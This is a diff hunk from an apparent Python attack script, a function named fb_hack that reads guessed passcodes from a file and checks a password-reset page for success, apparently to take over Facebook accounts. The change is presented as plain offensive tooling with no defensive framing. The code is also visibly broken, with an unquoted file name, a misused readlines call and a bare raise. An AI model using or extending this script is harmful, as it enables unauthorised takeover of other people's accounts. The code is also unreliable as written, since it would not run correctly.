@@ -224,16 +224,16 @@ def fb_hack(email, codex):
         else:
           print(s.join(success))
   else:
-    reset = 
-
-
+    with open(passcoder.txt, "r") as z:
+      reset = z.readlines(-1)
+      z.close()
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     print(browser.geturl())
     if soup.find(string="password_new") == test:
       print("Passcode not found")
       raise
-    else:
+    elif soup.find(string="password_new") != test:
       print("Passcode found!")
       print(y)
       browser.close()
